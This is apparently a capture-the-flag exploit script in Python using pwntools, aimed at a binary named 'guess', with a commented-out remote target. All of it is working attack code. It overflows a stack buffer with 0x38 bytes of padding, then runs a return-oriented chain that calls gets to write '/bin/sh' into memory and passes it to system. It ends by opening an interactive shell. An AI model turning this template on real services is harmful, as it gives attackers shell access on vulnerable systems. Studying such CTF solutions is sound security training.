#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = process("./guess")
# io = remote("172.1.3.6", 8888)
elf = ELF("./guess")
payload = "A"*0x38 + p64(0x400580)
flag = 0x4006BE 
pop_rdi = 0x0000000000400793
system = 0x4006C8
payload = "A"*0x38 + p64(pop_rdi) + p64(0x601070) + p64(elf.sym['gets']) + p64(pop_rdi) + p64(0x601070) + p64(system)
#  io.sendlineafter(".\n", "A"*0x38+p64(0x4006BE))
#  gdb.attach(io)
io.sendlineafter(".\n", payload)
sleep(0.5)
io.sendlineafter("\n", "/bin/sh\x00")

io.interactive()
